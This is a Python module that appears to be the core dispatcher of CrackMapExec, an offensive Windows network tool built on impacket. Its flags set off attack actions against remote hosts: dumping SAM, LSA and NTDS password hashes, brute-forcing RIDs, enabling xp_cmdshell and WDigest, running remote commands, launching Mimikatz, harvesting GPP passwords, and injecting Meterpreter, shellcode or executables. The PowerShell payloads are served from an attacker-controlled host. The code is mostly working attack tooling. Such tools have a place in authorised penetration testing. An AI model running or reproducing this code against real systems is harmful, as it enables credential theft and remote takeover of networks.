from logger import *
from powershell import *
from impacket import tds
from scripts.mssqlclient import *
from impacket.nmb import NetBIOSError
from impacket.smbconnection import SMBConnection, SessionError
from impacket.dcerpc.v5.rpcrt import DCERPCException
from executor import EXECUTOR
from sharedump import SHAREDUMP
from scripts.wmiquery import WMIQUERY
from scripts.samrdump import SAMRDump
from scripts.lookupsid import LSALookupSid
from scripts.secretsdump import DumpSecrets
from scripts.services import SVCCTL
from passpoldump import PassPolDump
from rpcquery import RPCQUERY
from smbspider import SMBSPIDER
from uacdump import UACdump
from wdigestenable import WdisgestEnable
from smartlogin import smart_login
from remotefilesystem import RemoteFileSystem
from datetime import datetime
import os
import socket
import settings
import traceback
import socket
import logging

def mssql_greenlet(host, server_name, domain):

    cme_logger = CMEAdapter(logging.getLogger('CME'), {'host': host, 
                                                       'hostname': server_name,
                                                       'port': settings.args.mssql_port,
                                                       'service': 'MSSQL'})

    try:
        ms_sql = tds.MSSQL(host, int(settings.args.mssql_port), cme_logger)
        ms_sql.connect()
    except socket.error as e:
        if settings.args.verbose: print_error(str(e))
        return

    if settings.args.mssql_instance:
        instances = ms_sql.getInstances(5)
        if len(instances) == 0:
            cme_logger.info("No MSSQL Instances found")
        else:
            cme_logger.success("Enumerating MSSQL instances")
            for i, instance in enumerate(instances):
                cme_logger.results("Instance {}".format(i))
                for key in instance.keys():
                   cme_logger.results(key + ":" + instance[key])

    if settings.args.mssql is not None:
        ms_sql = smart_login(host, domain, ms_sql, cme_logger)
        sql_shell = SQLSHELL(ms_sql, cme_logger)

        if settings.args.mssql != '':
            sql_shell.onecmd(settings.args.mssql)

        if settings.args.enable_xpcmdshell:
            sql_shell.onecmd('enable_xp_cmdshell')

        if settings.args.disable_xpcmdshell:
            sql_shell.onecmd('disable_xp_cmdshell')

        if settings.args.xp_cmd:
            sql_shell.onecmd("xp_cmdshell {}".format(settings.args.xp_cmd))

def main_greenlet(host):

    try:

        smb = SMBConnection(host, host, None, settings.args.port)
        try:
            smb.login('' , '')
        except SessionError as e:
            if "STATUS_ACCESS_DENIED" in e.message:
                pass

        domain = settings.args.domain
        s_name = smb.getServerName()
        if not domain:
            domain = smb.getServerDomain()
            if not domain:
                domain = s_name

        cme_logger = CMEAdapter(logging.getLogger('CME'), {'host': host, 
                                                           'hostname': s_name,
                                                           'port': settings.args.port,
                                                           'service': 'SMB'})

        cme_logger.info(u"{} (name:{}) (domain:{})".format(smb.getServerOS(), s_name, domain))

        if settings.args.mssql_instance or settings.args.mssql is not None:
            mssql_greenlet(host, s_name, domain)
            return

        try:
            '''
                DC's seem to want us to logoff first
                Windows workstations sometimes reset the connection, so we handle both cases here
                (go home Windows, you're drunk)
            '''
            smb.logoff()
        except NetBIOSError:
            pass
        except socket.error:
            smb = SMBConnection(host, host, None, settings.args.port)

        if (settings.args.user is not None and (settings.args.passwd is not None or settings.args.hash is not None)) or settings.args.combo_file:

            smb = smart_login(host, domain, smb, cme_logger)
            #Get our IP from the socket
            local_ip = smb.getSMBServer().get_socket().getsockname()[0]

            if settings.args.delete or settings.args.download or settings.args.list or settings.args.upload:
                rfs = RemoteFileSystem(host, smb, cme_logger)
                if settings.args.delete:
                    rfs.delete()
                if settings.args.download:
                    rfs.download()
                if settings.args.upload:
                    rfs.upload()
                if settings.args.list:
                    rfs.list()

            if settings.args.enum_shares:
                shares = SHAREDUMP(smb, cme_logger)
                shares.dump(host)

            if settings.args.enum_users:
                users = SAMRDump(cme_logger,
                                 '{}/SMB'.format(settings.args.port),
                                 settings.args.user, 
                                 settings.args.passwd, 
                                 domain, 
                                 settings.args.hash, 
                                 settings.args.aesKey,
                                 settings.args.kerb)
                users.dump(host)

            if settings.args.sam or settings.args.lsa or settings.args.ntds:
                dumper = DumpSecrets(cme_logger,
                                     'logs/{}'.format(host),
                                     smb,
                                     settings.args.kerb)

                dumper.do_remote_ops()
                if settings.args.sam:
                    dumper.dump_SAM()
                if settings.args.lsa:
                    dumper.dump_LSA()
                if settings.args.ntds:
                    dumper.dump_NTDS(settings.args.ntds,
                                     settings.args.ntds_history,
                                     settings.args.ntds_pwdLastSet)
                dumper.cleanup()

            if settings.args.pass_pol:
                pass_pol = PassPolDump(cme_logger,
                                 '{}/SMB'.format(settings.args.port),
                                 settings.args.user, 
                                 settings.args.passwd, 
                                 domain,
                                 settings.args.hash, 
                                 settings.args.aesKey,
                                 settings.args.kerb)
                pass_pol.dump(host)

            if settings.args.rid_brute:
                lookup = LSALookupSid(cme_logger,
                                      settings.args.user,
                                      settings.args.passwd,
                                      domain,
                                      '{}/SMB'.format(settings.args.port), 
                                      settings.args.hash, 
                                      settings.args.rid_brute)
                lookup.dump(host)

            if settings.args.enum_sessions or settings.args.enum_disks or settings.args.enum_lusers:
                rpc_query = RPCQUERY(cme_logger,
                                     settings.args.user, 
                                     settings.args.passwd, 
                                     domain, 
                                     settings.args.hash)

                if settings.args.enum_sessions:
                    rpc_query.enum_sessions(host)
                if settings.args.enum_disks:
                    rpc_query.enum_disks(host)
                if settings.args.enum_lusers:
                    rpc_query.enum_lusers(host)

            if settings.args.spider:
                smb_spider = SMBSPIDER(cme_logger, host, smb)
                smb_spider.spider(settings.args.spider, settings.args.depth)
                smb_spider.finish()

            if settings.args.wmi_query:
                wmi_query = WMIQUERY(cme_logger,
                                     settings.args.user,  
                                     domain,
                                     settings.args.passwd,
                                     settings.args.hash,
                                     settings.args.kerb,
                                     settings.args.aesKey)

                wmi_query.run(settings.args.wmi_query, host, settings.args.namespace)

            if settings.args.check_uac:
                uac = UACdump(cme_logger, smb, settings.args.kerb)
                uac.run()

            if settings.args.enable_wdigest or settings.args.disable_wdigest:
                wdigest = WdisgestEnable(cme_logger, smb, settings.args.kerb)
                if settings.args.enable_wdigest:
                    wdigest.enable()
                elif settings.args.disable_wdigest:
                    wdigest.disable()

            if settings.args.service:
                service_control = SVCCTL(cme_logger,
                                         settings.args.user, 
                                         settings.args.passwd, 
                                         domain,
                                         '{}/SMB'.format(settings.args.port),
                                         settings.args.service, 
                                         settings.args)
                service_control.run(host)

            if settings.args.command:
                EXECUTOR(cme_logger, 
                         settings.args.command, 
                         host, 
                         domain, 
                         settings.args.no_output, 
                         smb, 
                         settings.args.execm)

            if settings.args.pscommand:
                EXECUTOR(cme_logger, 
                         ps_command(settings.args.pscommand, settings.args.ps_arch), 
                         host, 
                         domain, 
                         settings.args.no_output, 
                         smb, 
                         settings.args.execm)

            if settings.args.mimikatz:
                powah_command = PowerShell(settings.args.server, local_ip)
                EXECUTOR(cme_logger, 
                         powah_command.mimikatz(), 
                         host, 
                         domain, 
                         True, 
                         smb, 
                         settings.args.execm)

            if settings.args.gpp_passwords:
                powah_command = PowerShell(settings.args.server, local_ip)
                EXECUTOR(cme_logger, 
                         powah_command.gpp_passwords(), 
                         host, 
                         domain, 
                         True, 
                         smb, 
                         settings.args.execm)      

            if settings.args.mimikatz_cmd:
                powah_command = PowerShell(settings.args.server, local_ip)
                EXECUTOR(cme_logger, 
                         powah_command.mimikatz(settings.args.mimikatz_cmd), 
                         host, 
                         domain, 
                         True, 
                         smb, 
                         settings.args.execm)

            if settings.args.powerview:
                #For some reason powerview functions only seem to work when using smbexec...
                #I think we might have a mistery on our hands boys and girls!
                powah_command = PowerShell(settings.args.server, local_ip)
                EXECUTOR(cme_logger, 
                         powah_command.powerview(settings.args.powerview), 
                         host, 
                         domain, 
                         True, 
                         smb, 
                         'smbexec')

            if settings.args.inject:
                powah_command = PowerShell(settings.args.server, local_ip)
                if settings.args.inject.startswith('met_'):
                    EXECUTOR(cme_logger, 
                             powah_command.inject_meterpreter(), 
                             host, 
                             domain, 
                             True, 
                             smb, 
                             settings.args.execm)

                if settings.args.inject == 'shellcode':
                    EXECUTOR(cme_logger, 
                             powah_command.inject_shellcode(), 
                             host, 
                             domain, 
                             True,
                             smb, 
                             settings.args.execm)

                if settings.args.inject == 'dll' or settings.args.inject == 'exe':
                    EXECUTOR(cme_logger, 
                             powah_command.inject_exe_dll(), 
                             host, 
                             domain, 
                             True, 
                             smb, 
                             settings.args.execm)
        try:
            smb.logoff()
        except:
            pass

    except SessionError as e:
        print_error("{}:{} {}".format(host, settings.args.port, e))
        if settings.args.verbose: traceback.print_exc()

    except NetBIOSError as e:
        print_error("{}:{} NetBIOS Error: {}".format(host, settings.args.port, e))
        if settings.args.verbose: traceback.print_exc()

    except DCERPCException as e:
        print_error("{}:{} DCERPC Error: {}".format(host, settings.args.port, e))
        if settings.args.verbose: traceback.print_exc()

    except socket.error as e:
        if settings.args.verbose: print_error(str(e))
        return
